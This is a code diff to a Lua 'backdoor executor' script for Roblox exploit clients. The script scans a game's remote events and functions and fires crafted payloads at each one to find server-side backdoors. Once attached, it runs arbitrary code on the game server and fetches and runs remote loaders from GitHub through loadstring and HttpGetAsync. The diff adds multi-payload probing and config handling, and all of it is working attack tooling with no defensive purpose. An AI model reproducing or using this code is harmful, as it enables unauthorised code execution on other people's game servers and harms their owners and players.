@@ -31,14 +31,8 @@ stdObj:SetAttribute("stderr", (not execSucc and result or nil))
 stdObj:SetAttribute("stdout", (#stdout > 0 and game:GetService("HttpService"):JSONEncode(stdout) or nil))
 task.delay(1, stdObj.Destroy, stdObj)
 ]]
-local testSource = [[local a,b,c,d=game:GetService("LogService"),game.SetAttribute,task.delay,"%s";b(a,d,"%s")c(5,b,a,d,nil)]]
+local sourcePayload = [[local a,b,c,d=game:GetService("LogService"),game.SetAttribute,task.delay,"%s";b(a,d,"%s|%s");c(5,b,a,d,nil)]]
 local stringList = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890!@#$%^&*()_+{}:"
-local configRaw = (
-	if isfile("bexe-config.lua") then
-		readfile("bexe-config.lua")
-	else
-		game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/scripts/main/backdoor-executor/bexe-config.lua")
-)
 local remoteInfo = {
 	["foundBackdoor"] = false,
 	["instance"] = nil,
@@ -117,6 +111,16 @@ local function pathToInstance(strPath)
 	return result
 end
 
+local function mergeArray(t1, t2)
+	t1 = table.clone(t1)
+
+	for index, value in t2 do
+		value = (if typeof(value) == "table" then table.clone(value) else value)
+		table.insert(t1, value)
+	end
+	return t1
+end
+
 local function generateRandString(lenght, lettersOnly)
 	local result = ""
 	local strTotalLenght = (if lettersOnly then 52 else #stringList)
@@ -160,19 +164,16 @@ end
 
 local function getRemotes()
 	local remotes = table.create(128)
-	local instancesList = (if getinstances then getinstances() else game:GetDescendants())
+	local instancesList = mergeArray(
+		(if getinstances then getinstances() else table.create(0)),
+		(if getnilinstances then getnilinstances() else table.create(0))
+	)
+	instancesList = mergeArray(game:GetDescendants(), instancesList)
 
 	for _, object in instancesList do
 		if not isRemoteAllowed(object) then continue end
 		local remoteObjId = getDebugId(object)
 		remotes[remoteObjId] = object
-	end
-
-	if getnilinstances then
-		for _, object in getnilinstances() do
-			if not isRemoteAllowed(object) then continue end
-			table.insert(remotes, object)
-		end
 	end
 	return remotes
 end
@@ -274,8 +275,8 @@ local function execScript(source, noRedirectOutput)
 	task.spawn(remoteFunc, remoteInfo.instance, unpack(remoteArgs))
 end
 
-local function initializeRemoteInfo(params)
-	if remoteInfo.foundBackdoor then return end
+local function initializeRemoteInfo(params, overwriteRemoteInfo)
+	if (overwriteRemoteInfo or remoteInfo.foundBackdoor) then return end
 
 	remoteInfo.foundBackdoor = true
 	for name, value in params do
@@ -303,9 +304,11 @@ local function initRemoteRedirection()
 	then
 		remoteRedirectionInitialized = true
 
-		remoteInfo.instance = redirectedRemote
-		remoteInfo.argSrcIndex = 1
-		remoteInfo.args = {"source"}
+		initializeRemoteInfo({
+			["instance"] = redirectedRemote,
+			["args"] = {"source"},
+			["argSrcIndex"] = 1
+		}, true)
 
 		insertService:GetAttributeChangedSignal("bexeremotepath"):Connect(function()
 			local newPath = insertService:GetAttribute("bexeremotepath")
@@ -319,22 +322,21 @@ local function initRemoteRedirection()
 				remoteInfo.instance = newRemote
 			end
 		end)
+		return true
 	else
 		warn(msgOutputs.failedRemoteRedirection)
+		return false
 	end
-	return remoteInfo.instance
 end
 
-local function onAttached(remoteObj, remoteInfoParams)
-	if not remoteObj or remoteInfo.foundBackdoor then return end
+local function onAttached(remoteInfoParams)
+	if remoteInfo.foundBackdoor then return end
 	getgenv().__BEXELUAATTACHED = true
-	warn(string.format(msgOutputs.attached, remoteObj:GetFullName(), remoteObj.ClassName))
+	warn(string.format(msgOutputs.attached, remoteInfoParams.instance:GetFullName(), remoteInfoParams.instance.ClassName))
 	sendNotification("Attached!")
-	initializeRemoteInfo(remoteInfoParams or {
-		["instance"] = remoteObj,
-	})
-
+	initializeRemoteInfo(remoteInfoParams)
 	initRemoteRedirection()
+
 	execGuiAPI = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/executor-gui/main/src/loader.lua"))({
 		customMainTabText = msgOutputs.mainTabText,
 		customExecution = true,
@@ -356,13 +358,32 @@ local function scanBackdoors()
 	local connection;
 	connection = logService.AttributeChanged:Connect(function(attributeName)
 		if attributeName ~= nonce then return end connection:Disconnect()
-		task.spawn(onAttached, remotesList[logService:GetAttribute(nonce)])
+		local payloadValue = logService:GetAttribute(nonce)
+		payloadValue = string.split(payloadValue, "|")
+		local remoteObj = remotesList[payloadValue[1]]
+		local payloadInfo = config.backdoorPayloads[payloadValue[2]]
+
+		task.spawn(onAttached, {
+			["instance"] = remoteObj,
+			["args"] = payloadInfo.Payload,
+			["argSrcIndex"] = table.find(payloadInfo.Payload, "source")
+		})
 	end)
 
 	local function testRemote(remoteObj, remoteObjId)
 		local remoteObjFunc = getRemoteFunc(remoteObj)
 
-		pcall(task.spawn, remoteObjFunc, remoteObj, string.format(testSource, nonce, remoteObjId))
+		for payloadName, payloadInfo in config.backdoorPayloads do runService.Heartbeat:Wait()
+			local remotePassed = (if payloadInfo.Verifier then payloadInfo.Verifier(remoteObj) else true)
+			if (not remotePassed or not payloadInfo.Payload) then continue end
+
+			local currentPayload = table.clone(payloadInfo.Payload)
+			local argSrcIdx = table.find(currentPayload, "source")
+			if not argSrcIdx then continue end
+
+			currentPayload[argSrcIdx] = string.format(sourcePayload, nonce, remoteObjId, payloadName)
+			pcall(task.spawn, remoteObjFunc, remoteObj, unpack(currentPayload))
+		end
 		-- this attempts to parent the remote to replicatedstorage if remote is parented to nil
 		-- because if the remote is parented to nil, firing/invoking the remote will be voided
 		if not game:IsAncestorOf(remoteObj) then
@@ -386,17 +407,32 @@ local function scanBackdoors()
 end
 -- main
 do -- config initialization
-	local succ, loadedConfig = pcall(loadstring(configRaw))
+	local configRaw = (
+		if isfile("bexe-config.lua") then
+			readfile("bexe-config.lua")
+		else
+			game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/scripts/main/backdoor-executor/bexe-config.lua")
+	)
+	local succ, loadedConfig do
+		succ, loadedConfig = pcall(loadstring(configRaw))
 
-	if (not succ) then
-		warn(msgOutputs.configCantLoad)
-		configRaw = game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/scripts/main/backdoor-executor/bexe-config.lua")
+		if (not succ) then
+			warn(msgOutputs.configCantLoad)
+			configRaw = game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/scripts/main/backdoor-executor/bexe-config.lua")
 
-		writefile("bexe-config.lua", configRaw)
-		loadedConfig = loadstring(configRaw)()
+			writefile("bexe-config.lua", configRaw)
+			loadedConfig = loadstring(configRaw)()
+		end
 	end
+	local successCount = 0
 
-	if loadedConfig.configVer < 5 then warn(msgOutputs.outdatedConfig) end
+	successCount += (if typeof(loadedConfig.autoExec) == "table" then 1 else 0)
+	successCount += (if typeof(loadedConfig.remoteFilters) == "table" then 1 else 0)
+	successCount += (if typeof(loadedConfig.scriptMacros) == "table" then 1 else 0)
+	successCount += (if typeof(loadedConfig.backdoorPayloads) == "table" then 1 else 0)
+	successCount += (if typeof(loadedConfig.cachedPlaces) == "table" then 1 else 0)
+
+	if (loadedConfig.configVer < 6 and successCount < 5) then warn(msgOutputs.outdatedConfig) end
 	config = loadedConfig
 end
 do -- backdoor finding
@@ -414,7 +450,7 @@ do -- backdoor finding
 			successCount += (if argSrcIndex then 1 else 0)
 
 			if successCount >= 3 then
-				onAttached(remoteObj, {
+				onAttached({
 					["instance"] = remoteObj,
 					["srcFunc"] = placeCacheData.SourceFunc,
 					["args"] = placeCacheData.Args,
@@ -425,10 +461,10 @@ do -- backdoor finding
 			end
 		else
 			if insertService:GetAttribute("bexeremotepath") then
-				local redirectedRemote = initRemoteRedirection()
+				local remoteRedirectSuccess = initRemoteRedirection()
 
-				if redirectedRemote then
-					onAttached(redirectedRemote) -- remote redirection is initialized here
+				if remoteRedirectSuccess then
+					onAttached(remoteInfo) -- remote redirection is initialized here
 				end
 			end
 			if (not remoteInfo.foundBackdoor) then -- we scan
